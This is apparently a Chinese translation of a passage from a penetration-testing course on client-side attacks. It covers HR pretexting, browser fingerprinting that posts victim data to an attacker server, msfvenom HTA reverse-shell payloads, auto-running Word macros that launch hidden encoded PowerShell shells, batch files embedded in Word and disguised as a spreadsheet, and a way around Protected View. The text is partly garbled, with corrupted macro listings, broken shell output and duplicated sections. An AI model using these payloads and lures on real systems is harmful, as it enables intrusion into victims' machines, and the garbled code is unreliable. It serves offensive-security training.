+第二天，我们收到一封邮件，显示令人惊讶的是，HR 部门无法打开我们的文档。为了尝试解决这个问题，我们进行了回复（如果可能，最好通过电话），询问他们使用的是哪个版本的 Microsoft Office，或者该问题可能是由版本不兼容引起的。这种对话可以持续，询问 Office 中可能开启的安全功能，或正在使用的操作系统版本。这种对话必须保持平衡、低调，并穿插一些解释问题合理性的注释，例如：“简历使用了高级功能以使其脱颖而出并使内容易于导航。”虽然这一过程超出了本模块的范围，但这种做法被称为`pretexing`³⁵⁸，可以大大提高我们的成功率。
+
+在我们的场景中，我们发现 HR 代表竟然在使用特定版本的 Microsoft Office，并且他们允许执行宏。有了这些信息后，我们编写了第二个 Word 文档，其中包含一个利用 PowerShell 打开反向 Shell 并将其通过邮件发送给他们的宏。当然，这是一个简化的故事。社会工程学预设确实必须更加复杂，并且基于你提前收集的信息。
+
+## 1.2 客户端指纹识别
+
+客户端指纹识别对于我们攻击的成功至关重要，但为了获取最精确的信息，我们通常必须从目标本身收集。Web 浏览器是收集目标信息的良好向量。它们的演进、复杂性和功能丰富性对于终端用户和攻击者来说，都是一把双刃剑。
+
+- 最可靠的是那些直接利用 `JavaScript` 等常用组件的浏览器。
+
+# 攻击性安全
+
+例如，我们将使用 `Fingerprint2` JavaScript 库，可以通过从其 GitHub 仓库下载并解压项目来安装：
+
+
+
+```bash
+kali@kali:/var/html$ sudo wget https://github.com/Valve/fingerprint2/archive/master.zip
+2019-07-24 02:42
+kali@kali:/var/html$ sudo unzip master.zip
+Archive: master.zip
+creating: fingerprint2-master/
+extracting: fingerprint2-master/.eslintrc
+extracting: fingerprint2-master/fingerprint2.js
+...
+kali@kali:/var/html$ sudo mv fingerprint2-master/fp fp/
+```
+
+我们可以根据项目包含的示例将其整合到 HTML 文件中。我们将在位于 Kali 服务器 `/var/www/html/fp` 目录下的 `fingerprint2.html` 文件中包含 Fingerprint2 库：
+
+```bash
+kali@kali:/var/html/fp$ cat fingerprint2.html
+<!DOCTYPE html>
+<html>
+<head>
+<title>Fingerprint2 test</title>
+</head>
+<body>
+    <h1>Fingerprint2</h1>
+    <p>Your browser fingerprint: <strong id="fp"></span></p>
+    <p><code id="time"></code></p>
+    <p><span id="details"></span></p>
+    <script src="fingerprint2.js"></script>
+    <script>
+        var d1 = new Date();
+        var options = {};
+        var values = fingerprint2.get(options, function (component) { return component.value });
+        var murmur = fingerprint2.murmur3hash(values.join(','), 31);
+        var d2 = new Date(); // calculate the fingerprint: " + (d2 - d1) + "ms"
+        var details = "<strong>Detailed information: </strong><br />";
+        if(typeof window.console != "undefined") {
+            for (var index in components) {
+                var obj = components[index];
+                var value = obj.value;
+                if (value == null) {
+                    var line = obj.key + " = " + value.toString().substring(0, 150);
+                    details += line + "<br/>";
+                }
+            }
+            document.querySelector("#details").innerHTML = details;
+            document.querySelector("#fp").textContent = murmur;
+            document.querySelector("#time").textContent = timeString;
+        }
+    </script>
+</body>
+</html>
+```
+
+### 列表 380 - 使用 Fingerprint2 JavaScript 库
+
+列表 380 中的 JavaScript 代码调用了 Fingerprint2 静态函数来开始指纹识别过程。库返回的 `components` 变量是一个包含从客户端提取的所有信息的数组。存储在 `components` 数组中的值被传递给 `murmur3` 函数以创建浏览器哈希指纹。最后，相同的值被提取并显示在 HTML 页面中。
+
+上述来自我们 Windows 实验机器的网页（图 240）显示，几行 JavaScript 代码提取了浏览器的 User Agent 字符串、其本地化信息、已安装浏览器插件及其相对版本、关于底层 Win32 操作系统平台的通用信息以及其他细节：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_415_0.png)
+
+## Fingerprint2
+
+您的浏览器指纹：02bc40b04b3183bb4eba2fa125261
+
+计算指纹所需时间：256ms
+
+```
+详细信息：
+useragent = Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3039.111 Safari/537.36
+language = en-US
+colorDepth = 24
+deviceMemory = 8
+hardwareConcurrency = 4
+screenResolution = 1920x1080
+platform = Win32
+touchPoints = 0
+webdriver = false
+```
+
+### 列表 381 - 使用 Linux 进行渗透测试
+
+| 简单字符串 | 软件 | 操作系统 |
+
+| :--- | :--- | :--- |
+
+| Edge 41 | Windows | 10 |
+
+| 简单描述 | 软件名称 | 操作系统名称 |
+
+| 平台 | 软件代码 | 操作系统代码 |
+
+| | 41.0.2229.66 | Windows |
+
+| | 软件版本 | 操作系统版本 |
+
+| | 41.0.2229.66 | 操作系统版本（完整） |
+
+| 最新引擎名称 | NT.0 | |
+
+| 最新HTML | | 系统框架 |
+
+| 最新引擎版本 | 16299 | |
+
+| 软件类型 | 杂项 |
+
+| 浏览器, Web | 杂项 |
+
+| 硬件类型 | 平台 |
+
+图 241：通过 http://dev.whatbrowser.com/user agent 识别浏览器版本
+
+注意 User Agent 字符串告诉我们 Microsoft Edge 41 运行在 32 位 Windows 上。对于 64 位的 Windows 版本，该字符串本应包含有关 64 位架构的信息：
+
+```Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/58.0.3039.111 Safari/537.36
+```
+
+### 列表 382 - 64 位版本上相同版本 Edge 的 User Agent 字符串
+
+我们获取了想要的信息，但列表 380 中的 JavaScript 代码将数据显示给受害者而不是攻击者。这没有太大用，因此我们需要找到一种将提取的信息传输到我们攻击服务器的方法。
+
+几行 Ajax³⁵⁸ 代码即可解决问题。列表 383 显示了之前使用的指纹网页的修改版本。在这些代码中，我们使用 `XMLHttpRequest` JavaScript API 通过 POST 请求与攻击服务器进行交互。POST 请求只是针对存储恶意网页的同一台服务器，因此 `xmlhttp.open` 方法中的 URL 并没有提供 IP 地址。
+
+# 攻击安全
+
+`components` 数组包含了由 Fingerprint 库提取的信息，通过几行 JavaScript 代码进行处理，与之前的示例类似。然而，这次输出结果通过 POST 请求发送到 `js.php`。关键组件在下面的列表 383 中高亮显示：
+
+
+
+```html
+<doctype html>
+<html>
+<head>
+<title>Blank Page</title>
+</head>
+<body>
+<h1>You have been given the finger!</h1>
+<script src="fingerprint2.js"></script>
+<script>
+var d1 = new Date();
+var options = {};
+Fingerprint2.get(options, function (components) {
+var values = components.map(hash128.values.join('.','), 31)
+var murmur = Fingerprint2.xhash128.values.join('.');
+var clientfp = "Client browser fingerprint: " + murmur + " and murmur\n\n";
+var d2 = new Date();
+var timestamping = "time to calculate fingerprint: " + (d2 - d1) + " and ms\n\n";
+var details = "Detailed information: \n";
+if(typeof window.console ===="undefined") {
+for (var index in components) {
+var obj = components[index];
+var value = obj.value;
+if (value !== null) {
+var line = obj.key + " = " + value.toString().substr(0, 150);
+details += line + "\n";
+}
+}
+}
+var xmlhttp = new XMLHttpRequest();
+xmlhttp.open("POST", "/fp/js.php");
+xmlhttp.setRequestHeader("Content-Type", "application/txt");
+xmlhttp.send(clientfp + timestamping);
+});
+</script>
+</body>
+</html>
+```
+
+### 列表 383 - 处理向攻击服务器 POST 请求的浏览器信息：
+
+让我们来看 `/fp/js.php`。处理 POST 请求的 PHP 代码
+
+```php
+<?php
+$data = "Client IP Address: " . $_SERVER['REMOTE_ADDR'] . " \n";
+$data = file_get_contents('/php/input/');
+$data .= "----------------------------------------------------------------------\n";
+file_put_contents('/var/www/html/fp/fingerprint.txt', print_r($data, true), FILE_APPEND | LOCK_EX);
+?>
+```
+
+### 列表 384 - 处理 JavaScript POST 请求并将上传的数据导出到文件的 PHP 代码
+
+PWK 2.0
+
+版权 © Offensive Security Ltd. 保留所有权利。
+
+# 攻击安全
+
+使用 Kali Linux 进行渗透测试 2.0
+
+PHP 代码从 `$_SERVER` 数组中提取客户端 IP 地址，该数组包含了服务器和执行环境信息。然后将 IP 地址拼接到从 JavaScript POST 请求接收到的文本字符串中，并写入 `/var/www/html/fp/` 下的 `fingerprint.txt` 文件。注意使用 `FILE_APPEND` 标志，它允许我们将多个指纹存储到同一个文件中。
+
+为了使此起作用，我们需要允许 `Apache-data` 用户写入 `fp` 目录：
+
+```bash
+kalijali:/var/www/html/ sudo chown www-data:www-data fp
+```
+
+### 列表 385 - 修改目录权限
+
+一旦浏览器获取了 `fingerprint2.html` 网页（图 242），我们就可以检查攻击服务器上 `fingerprint.txt` 的内容：
+
+Client IP Address: 10.11.0.2
+
+Client browser fingerprint: ff043c84bcac49b150787733c5e3f2e
+
+Time to calculate the fingerprint: 625ms
+
+Detailed information:
+
+userAgent = Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/538.0.3092.110 Safari/537.36 Edge/16.2629
+
+webdriver = false
+
+language = en-US
+
+colorDepth = 24
+
+deviceMemory = not available
+
+hardConcurrency = 1
+
+screenResolution = 787,126
+
+availableScreenResolution = 747,120
+
+timezoneOffset = 420
+
+timezone = America/Los_Angeles
+
+sessionStorage = true
+
+localStorage = true
+
+indexedDB = true
+
+addBehavior = false
+
+Database = false
+
+cpuClass = not available
+
+platform = Win32
+
+plugins = Edge PDF Viewer,Portable Document Format,application/pdf,pdf
+
+canvas = windows:yes,canvas fp:data:image/png;base64,iVBORw0KGAAAANSUhEUgAAAAAAAAEAAACAYAAAAfFcSJAAAADUlRT42mggg
+
+glVendorAndRenderer = Microsoft-Basic Render Driver
+
+adBlock = false
+
+hashiedLanguages = false
+
+hashiedResolution = false
+
+hashiedOs = false
+
+hashiedBrowser = false
+
+touchSupport = 0,false,false
+
+fonts = Arial,Arial Black,Arial Normal,Arial Rounded Bold,Book Antiqua,Bookman Old
+
+audio = 124.08738721917
+
+> 339 (The PHP Group, 2019), via https://www.php.net/manual/en/reserved.variables.php
+
+PWK 2.0
+
+版权 © Offensive Security Ltd. 保留所有权利。
+
+# 攻击安全
+
+使用 Kali Linux 进行渗透测试 2.0
+
+### 列表 386 - 处理向攻击服务器 POST 请求的浏览器信息：
+
+让我们来看 `/fp/js.php`。处理 POST 请求的 PHP 代码
+
+PHP 代码从 `$_SERVER` 数组中提取客户端 IP 地址，该数组包含了服务器和执行环境信息。然后将 IP 地址拼接到从 JavaScript POST 请求接收到的文本字符串中，并写入 `/var/www/html/fp/` 下的 `fingerprint.txt` 文件。注意使用 `FILE_APPEND` 标志，它允许我们将多个指纹存储到同一个文件中。
+
+为了使此起作用，我们需要允许 `Apache-data` 用户写入 `fp` 目录：
+
+```bash
+kalijali:/var/www/html/ sudo chown www-data:www-data fp
+```
+
+一旦浏览器获取了 `fingerprint2.html` 网页（图 242），我们就可以检查攻击服务器上 `fingerprint.txt` 的内容：
+
+Client IP Address: 10.11.0.2
+
+Client browser fingerprint: ff043c84bcac49b150787733c5e3f2e
+
+Time to calculate the fingerprint: 625ms
+
+Detailed information:
+
+
+
+`userAgent` = Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/538.0.3092.110 Safari/537.36 Edge/16.2629
+
+`webdriver` = false
+
+`language` = en-US
+
+`colorDepth` = 24
+
+`deviceMemory` = not available
+
+`hardConcurrency` = 1
+
+`screenResolution` = 787,126
+
+`availableScreenResolution` = 747,120
+
+`timezoneOffset` = 420
+
+`timezone` = America/Los_Angeles
+
+`sessionStorage` = true
+
+`localStorage` = true
+
+`indexedDB` = true
+
+`addBehavior` = false
+
+`Database` = false
+
+`cpuClass` = not available
+
+`platform` = Win32
+
+`plugins` = Edge PDF Viewer,Portable Document Format,application/pdf,pdf
+
+`canvas` = windows:yes,canvas fp:data:image/png;base64,iVBORw0KGAAAANSUhEUgAAAAAAAAEAAACAYAAAAfFcSJAAAADUlRT42mggg
+
+`glVendorAndRenderer` = Microsoft-Basic Render Driver
+
+`adBlock` = false
+
+`hashiedLanguages` = false
+
+`hashiedResolution` = false
+
+`hashiedOs` = false
+
+`hashiedBrowser` = false
+
+`touchSupport` = 0,false,false
+
+`fonts` = Arial,Arial Black,Arial Normal,Arial Rounded Bold,Book Antiqua,Bookman Old
+
+`audio` = 124.087387219147
+
+> 339 (The PHP Group, 2019), via https://www.php.net/manual/en/reserved.variables.php
+
+PWK 2.0
+
+版权 © Offensive Security Ltd. 保留所有权利。
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+## 列表 387 - 打开 cmd.exe 的 HTA 文件
+
+我们可以将此代码放在 Kali 机器上的文件中 (`poc.hta`)，并通过 Apache Web 服务器提供服务。一旦受害者使用 Internet Explorer 访问此文件，就会看到图 243 所示的弹出对话框。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_422_0.png)
+
+图 243：第一个对话框
+
+此对话框是尝试执行 `.hta` 文件的结果。选择“打开”(`Open`)将弹出另一个对话框：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_422_1.png)
+
+图 244：第二个对话框
+
+第二个对话框是因为 Internet Explorer 的沙箱保护（也称为保护模式<sup>346</sup>）默认启用。受害者可以选择“允许”(`Allow`)来许可该操作，这将执行 JavaScript 代码并启动 `cmd.exe`，如图 245 所示。
+
+> 346 (Microsoft, 2011), https://technet.microsoft.com/en-us/windows/bb250462(v=vs.60)
+
+PWK 2.0
+
+Copyright © Offensive Security Ltd. 版留所有。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_423_0.png)
+
+当 `mshta.exe` 执行时，它会在我们的命令提示符后面打开一个额外的窗口。
+
+为了避免这种情况，我们可以更新概念证明，使用下方的 `.close();` 对象方法来关闭此窗口：
+
+```
+<html>
+<head>
+<script>
+var c = 'cmd.exe'
+new ActiveXObject('WScript.Shell').Run(c);
+</script>
+</head>
+<body>
+<script>
+self.close();
+</script>
+</body>
+</html>
+```
+
+这已经演示了 HTA 漏洞的基本功能，但我们需要“更加努力”（Try Harder）才能将其转化为攻击。我们不再使用 `Run` 方法启动 `cmd.exe`，而是转向强大得多且功能更 PowerShell 框架。
+
+# HTA 攻击实战
+
+## 13.2.2
+
+我们将使用 `msfvenom` 将我们的基础 HTML 应用程序转换为攻击，依靠 `hta-ps` 输出格式创建一个基于 PowerShell 的 HTA 负载。在列表 389 中，生成了完整的反向负载并在 `evil.hta` 文件上执行。
+
+```
+kali@kali:~$ sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-ps -o /var/www/html/evil.hta
+No platform was selected, choosing Msf::Platform:Windows from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars selected, outputting raw payload
+Payload size: 324 bytes
+Final size of hta-ps file: 6461 bytes
+saved as:/var/www/html/evil.hta
+```
+
+> 列表 389 - 使用 `msfvenom` 创建 HTA 负载
+
+让我们查看列表 390 中生成的 hta 文件，以理解它是如何工作的。首先注意到的点之一是变量名已被随机化，以便检测并阻碍反病毒软件。
+
+```
+kali@kali:~$ sudo cat /var/www/html/evil.hta
+<script>
+window.moveTo(-4000,-4000)
+Set qkRBwfYUK = CreateObject("Script.Shell")
+Set tso = CreateObject("Script.FileSystem.ExpandEnvironmentStrings("%PSModulePath%"),")
+For each path in Split(iqkRBwfYUK.Path, ".")
+If t6i2tNt.FileExists("powershell.exe") Then
+k8RBwfYUK.Run("powershell.exe -nop -w hidden -aQmaWwBJAG4ABQQAcg...")
+</script>
+```
+
+> 列表 390 - `msfvenom` 生成的 HTA 文件内容
+
+在列表 390 的高亮行，注意 PowerShell 是通过 Windows Script Host 的 `Run` 方法结合命令行执行的。
+
+第一个参数 `-nop` 是 `-NoProfile` 的缩写，它确保 PowerShell 不加载用户配置文件。
+
+当 PowerShell 启动时，默认会加载任何现有的用户配置文件，这可能会影响我们代码的执行。此选项将避免该潜在问题。
+
+接下来，我们的脚本使用 `-w hidden`（`-Window` 的缩写）避免在用户桌面上创建窗口。
+
+最后，极其重要的 `-e` 标记（`-EncodedCommand` 的缩写）允许我们直接将 Base64 编码的 PowerShell 脚本作为命令行参数。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_424_0.png)
+
+# 使用 Kali Linux 进行渗透测试
+
+我们将在我们的 Kali 机器上托管这个新的 HTA，并启动 `netcat` 监听器来测试攻击。我们将通过访问恶意 URL 来。如果一切顺利，我们应该能够捕获反向 shell：
+
+
+
+```
+kali@kali:~$ nc -lvnp 4444
+listening on 10.11.0.4 port 4444
+connect to [10.11.0.5] 4444 sent [0-length] received [0-length]
+connect to [10.11.0.5] 4444 sent [0-length] received [0-length]
+(10.11.0.5)4444> whoami
+nt authority
+connect to [10.11.0.5] 4444 sent [0-length] received [0-length]
+connect to [10.11.0.5] 4444 sent [0-length] received [0-length]
+```
+
+(Microsoft)
+
+如果连接没有被防火墙拦截，我们能够在受害机器上执行命令。
+
+## 13.2.1 练习
+
+1. 使用 `msfvenom` 将我们的基础 HTML 应用程序转换为攻击。
+2. 是否可以使用 HTA 绕过反病毒软件？
+3. 我们如何利用沙箱保护？
+
+## 13.3 利用 Office
+
+Microsoft Word 宏可能是最老且最为人知的客户端攻击向量。Word 和 Excel 等 Office 应用程序允许用户嵌入宏，即为了程序化完成任务而组合的一系列命令和指令。¹
+
+有趣的是，宏可以使用 Visual Basic for Applications (VBA) 从头编写。⁵² 这是一种功能完整的脚本语言，具有访问 ActiveX 对象和 Windows Script Host 的权限，类似于 HTML 中的 JavaScript。
+
+### 13.3.2 Microsoft Word 宏
+
+创建 Word 宏只需选择“视图”（VIEW）选项卡并选择“宏”（Macros）。如图 249 所示，我们只需为宏输入一个名称，并在“宏”下拉菜单中选择插入宏的文档名称。当我们点击“创建”（Create）时，一个简单的宏框架将插入到我们的文档中。
+
+# 使用 Kali Linux 进行渗透测试 2.0
+
+![](img/f99f528ca9845f4c256ce54e882b1345_428_0.png)
+
+图 249：创建一个 Microsoft Word 宏
+
+让我们检查我们的简单宏（如列表 392 所示）并讨论 VBA 的基础。我们 VBA 宏中使用的主过程以 `Sub` 关键字开始，以 `End Sub` 结束。这本质上标记了我们宏的主体。
+
+> `Sub` 过程与 VBA 中的 `Function` 非常相似。区别在于 `Sub` 过程不能用于表达式中，因为它们不返回任何值，而 `Function` 则可以：
+
+此时，我们的新宏 `MyMacro()` 仅仅是一个空过程和几行以单引号（apostrophe）开头的代码，单引号标记了 VBA 中注释的开始。
+
+```
+Sub MyMacro()
+  ' MyMacro Macro
+  '
+
+End Sub
+```
+
+列表 392 - 默认空宏
+
+355 (Microsoft, 2017), https://docs.microsoft.com/en-us/office/vba/Language/Concepts/Getting-Started/calling-sub-and-function-procedures
+
+# 使用 Kali Linux 进行渗透测试 2.0
+
+为了像之前一样调用用于 ActiveX 的 Windows Scripting Host，我们可以使用 `CreateObject` 函数并配合 `Wscript.Shell Run` 方法。该宏的代码如下所示：
+
+```
+Sub MyMacro()
+    CreateObject("Wscript.Shell").Run "cmd"
+End Sub
+```
+
+列表 393 - 打开 `cmd.exe` 的宏
+
+由于 Office 宏不会自动执行，我们必须利用两个预定义过程：`AutoOpen` 过程（在打开新文档时执行）和 `Document_Open` 过程（在重新打开一个已打开的文档时执行）。这两个过程都可以调用我们的自定义过程并重新运行我们的代码。
+
+我们的 VBA 代码在下方的列表 394 中。
+
+```vba
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    CreateObject("Wscript.Shell").Run "cmd"
+End Sub
+```
+
+列表 394 - 自动执行 `cmd` 的宏
+
+我们必须将包含内容的文档保存为 `.docm` 或旧的 `.doc` 格式（后者支持嵌入宏），但必须避免 `.docx` 格式，因为后者不支持宏。
+
+当我们重新打开包含我们宏的文档时，会看到一个安全警告（图 250），指示宏已被禁用。我们必须点击“启用内容”（Enable Content）来运行宏。这是 Microsoft Office 的默认安全设置，可以完全禁用宏的使用来防止此类攻击，也可以保持启用状态，因为它们在大多数环境中被广泛使用。
+
+34 (Microsoft, 2017), https://docs.microsoft.com/en-us/office/vba/Language/Reference/User-Interface-Help/createobject-function
+
+355 (Microsoft, 2017), https://docs.microsoft.com/en-us/office/vba/api/Word.Documents.Open
+
+![](img/f99f528ca9845f4c256ce54e882b1345_430_0.png)
+
+| 文件 | 开始 | 插入 | 设计 | 页面布局 | 引用 | 邮件 | 审阅 | 视图 |
+
+|---|---|---|---|---|---|---|---|---|
+
+| | Calibri | 11 | A A | | | | | |
+
+| 格式刷器 | B | I | U | <u>x</u> | 孩子 | | | |
+
+| | | | | | | | | |
+
+| 安全警告 宏已禁用。 | 启用内容 | | | | | | | |
+
+图 250：Microsoft Word 宏安全警告，并将打开一个命令提示符。
+
+一旦处理了“启用内容”按钮，宏就会执行。在现实世界中，如果受害者不点击“启用内容”，攻击将失败。为了克服这一点，受害者必须不知道潜在的后果，或者被文档的呈现方式充分鼓励点击此按钮。
+
+与初始的 HTML 应用一样，执行命令只是开始，但反向 shell（reverse shell）会好得多。在结束之前，我们将再次转向 PowerShell，并复用使用 Base64 编码字符串执行 Metasploit shellcode 的能力。
+
+为了实现这一点，我们将声明一个类型为 `String` 的变量 `Dim Str`），其中包含我们想要执行的 PowerShell 命令。我们将在宏中添加一行代码来为我们的变量预留空间：
+
+```vba
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    CreateObject("Wscript.Shell").Run Str
+End Sub
+```
+
+395 - 创建你的第一个字符串变量
+
+我们可以将 Base64 编码的 PowerShell 脚本嵌入单个字符串，但 VBA 对字符串有字符限制。此限制不适用于字符串变量，因此我们可以将命令拆分为多行并将它们拼接。
+
+我们将使用一个简单的 Python 脚本来拆分命令：
+
+```python
+str = "powershell.exe -nop -w hidden JABZACACAAPQAGAE4AZQB3AC......"
+```
+
+> (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/language/reference/statements/dim
+
+```python
+n = 50
+for i in range(0, len(str), n):
+    print("Str " + str[i:i+n])
+```
+
+将 Base64 编码字符串拆分成较小的块后，我们可以像列表 397 所示更新我们的利用程序：
+
+
+
+```vba
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    Str = "powershell.exe -nop -w hidden JABZACACAAPQAGAE4AZQB3ACwADggACwwggggwwwwwgggggggACggACStr = "powershell.exe -nop -w hidden JABZACACAAPQAGAE4AZQB3ACwADggACACww
+ww..hellhellwwwwwwwwwwwwwgwADgACwADgACggwACgggACwADggggggg
+ACStr = "powershell.exe -nop -w hidden JABZACACAAPQAGAE4AZQB3ACwADggggg
+ACStr = "powershell.exe -nop -w hidden JABZACACAAPQAGAE4AZQB3ACwADggACg
+ACStr = "powershell.exe -nop -w hidden JABZACACAAPQAGAE4AZQB3ACwADggACgg
+ACStr = "powershell.exe -nop -w hidden JABZACACAAPQAGAE4AZQB3ACwADggACgg
+ACStr = "powershell.exe -nop -w hidden JABZACACAAPQAGAE4AZQB3ACwADggACgg
+ACStr = "powershell.exe -nop -w hidden JABZACACAAPQAGAE4AZQB3ACwADggACgg
+ACStr = "powershell.exe -nop -w hidden JABZACACAAPQAGAE4AZQB3ACwADggACgg
+ACStr = "powershell.exe -nop -w hidden JABZACACAAPQAGAE4AZQB3ACwADggACgg
+ACStr = "powershell.exe -nop -w hidden JABZACACAAPQAGAE4AZQB3ACwADggACgg
+ACStr = "powershell.exe -nop -w hidden JABZACACAAPQAGAE4AZQB3ACwADggACgg
+ACStr = "powershell.exe -nop -w hidden JABZACACAAPQAGAE4AZQB3ACwADggACgg
+ACStr = "powershell.exe -nop -w hidden JABZACACAAPQAGAE4AZQB3ACwADggACgg
+ACStr = "powershell.exe -nop -w hidden JABZACACAAPQAGAE4AZQB3ACwADggACgg
+ACStr = "powershell.exe -nop -w hidden JABZACACAAPQAGAE4AZQB3ACwADggACgg
+ACStr = "powershell.exe -nop -w hidden JABZACACAAPQAGAE4AZQB3ACwADggACgg
+ACStr = "powershell.exe -nop -w hidden JABZACACAAPQAGAE4AZQB3ACwADggACgg
+ACStr = "powershell.exe -nop -w hidden JABZACACAAPQAGAE4AZQB3ACwADggACgg
+ACStr = "powershell.exe -nop -w hidden JABZACACAAPQAGAE4AZQB3ACwADggACgg
+ACStr = "powershell.exe -nop -w hidden JABZACACAAPQAGAE4AZQB3ACwADggACgg
+    CreateObject("Wscript.Shell").Run Str
+End Sub
+```
+
+当我们重新打开包含宏的文档时，宏就会执行。如果在打开更新文档之前启动 Netcat 监听器，我们将看到看到：
+
+```
+kali@kali:-$ nc -lnvp 4444
+listening on [any] 4444
+connect to [10.11.0.4] from (UNKNOWN)
+111111...22
+
+ Windows Windows [Version 0000113344500
+
+()))0......
+
+
+
+
+
+
+
+\
+
+
+
+
+
+
+
+                 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3
+ 
+ 
+ 
+ 
+
+```
+
+`C:\Users\Offsec\`
+
+列表 396 - 拆分 Base64 编码字符串的 Python 脚本
+
+列表 397 - 创建反向 shell 的宏
+
+列表 398 - 来自宏的反向 shell
+
+# 攻击性安全练习
+
+## 13.3.2.1
+
+- 1. 使用 HTA 攻击的 PowerShell 负载创建一个向你的 Kali 系统发送反向 shell 的宏。
+
+## 13.3.3 链接与嵌入
+
+另一种流行的 Microsoft Office 客户端攻击利用动态数据交换（DDE）在 Office 文档中执行任意程序，但自 2017 年 12 月起已修复。
+
+然而，我们仍然可以使用对象链接与嵌入（OLE）来利用 Microsoft Office 的文档嵌入功能。
+
+在这种攻击场景中，我们将 Windows 处理文件嵌入到 Microsoft Word 文档中。
+
+Windows 批文件是一种旧格式，通常被更现代的 Windows 脚本语言（如 VBScript 和 PowerShell）取代。但处理脚本在 Windows 10 上仍然有效并允许执行应用程序。以下列表显示了一个启动 `cmd.exe` 的初始概念处理脚本：
+
+```
+START cmd.exe
+```
+
+列表 399 - 启动 `cmd.exe` 的简单处理文件
+
+接下来，我们将上述脚本包含在 Word 文档中。打开 Microsoft Word，创建一个新文档，导航到“插入”选项卡并点击“对象”菜单。在这里，我们选择“从文件”选项卡并选择我们新创建的处理脚本 `launch.bat`。
+
+# 攻击性安全
+
+Kali Linux 2.0 渗透测试
+
+![](img/f99f528ca9845f4c256ce54e882b1345_433_0.png)
+
+图 251：在 Microsoft Word 中嵌入快捷方式文件
+
+我们还可以更改 Word 中批处理文件的外观，使其看起来更无害。要做到这一点，我们只需勾选*显示为*（Display as）图标框并选择“更改图标”（Change Icon），这将弹出图 252 所示的菜单，允许我们进行修改。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_433_1.png)
+
+图 252：选择图标
+
+尽管这是一个嵌入的批处理文件，但微软允许我们为其选择不同的图标并输入标题，受害者将看到标题，而不是实际文件名。在上面的示例中，我们选择了 Microsoft Excel 的图标，并命名为 *ReadMe.xls*，以完全掩盖批处理文件，试图降低受害者的怀疑。在接受菜单选项后，批处理文件被嵌入到 Microsoft Word 文档中。接下来，必须诱骗受害者双击它，并接受图 253 所示的安全警告。
+
+# 攻击性安全
+www.offensive-security.com
+
+Kali Linux 2.0 渗透测试
+
+![](img/f99f528ca9845f4c256ce54e882b1345_434_0.png)
+
+图 253：打开嵌入的快捷方式
+
+受害者一旦接受警告，`cmd.exe` 就会启动。一旦我们有了执行任意程序的能力，就可以通过 Base64 编码命令将其转换为 PowerShell 的执行。这次的转换非常简单，我们只需要像列表 400 所示，将 exe 更改为之前使用的 PowerShell 版本即可。
+
+```
+START powershell.exe -nop -w hidden -e JABZCAABAAQAG4AEZZB3AC0AtwB1AgoAZQBJ)....
+```
+
+列表 400 - 反 shell 的批处理文件
+
+在嵌入更新后的批处理文件后，双击它将导致产生反 shell。
+
+```
+kali@~$ nc -lvnp 4444
+
+listening on [any] 4444
+
+connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 50115
+
+Microsoft Windows [Version 10.0.17134,590]
+
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Offsec:
+```
+
+
+
+列表 401 - 从我们的 OLE 对象接收到的 shell
+
+# 13.3.1 练习
+
+- 1. 使用 PowerShell 负载创建一个批处理文件并将其嵌入 Microsoft Word 文档中，向你的 Kali 系统发送反 shell。
+
+# 13.3.4 规避受保护视图
+
+此 Microsoft Word 文档在本地提供时非常有效，但当从 Internet 通过电子邮件或下载链接提供时，我们必须绕过名为“受保护视图”（Protected View）的保护层，该视图会禁用文档中的所有编辑和修改，并阻止宏或嵌入对象的执行。
+
+为了模拟这种情况，我们将包含嵌入批处理文件的 Microsoft Word 文档复制到 Kali 机器并将其托管在 Apache 服务器上。然后，我们可以从服务器下载该文档并在受害者机器上打开它。此时，受保护视图已激活（如图 254 所示），我们无法执行批处理文件。
+
+| 文件 工具 | MacroTest(受保护视图) - Word |
+|---|---|
+| 受保护视图 注意—来自 Internet 的内容可能包含病毒。除非你需要编辑，否则留在受保护视图中更安全。 | 启用编辑 |
+
+图 254：受保护视图正在运行
+
+虽然受害者可能会点击“启用编辑”并退出受保护视图，但这不太。理想情况下，我们更喜欢完全绕过受保护视图，实现这一点的一种直接方法是使用其他 Office 应用。
+
+类似于 Microsoft Word，Microsoft Publisher 也与 Word 和 Excel 完全相同允许嵌入对象和最终代码执行，但它不会对 Internet 传输的文档启用保护视图。可以使用之前应用于 Word 的策略来绕过这些限制，但缺点是 Publisher 的使用频率低于 Word 或 Excel。尽管如此，如果你的指纹检测到 Publisher 被感染，这可能是一个可行且更好的向量。
+
+# 13.3.4.1 练习
+
+- 1. 通过模拟从 Internet 下载 Microsoft Word 文档来触发受保护视图保护。
+- 2. 重用批处理文件并将其嵌入 Microsoft Publisher 文档中，向你的 Kali 系统接收反 shell。
+- 3. 将文件移动到 Apache Web 服务器，以模拟从 Internet 下载 Publisher 文档并确认受保护视图。
+
+### 13.4 总结
+
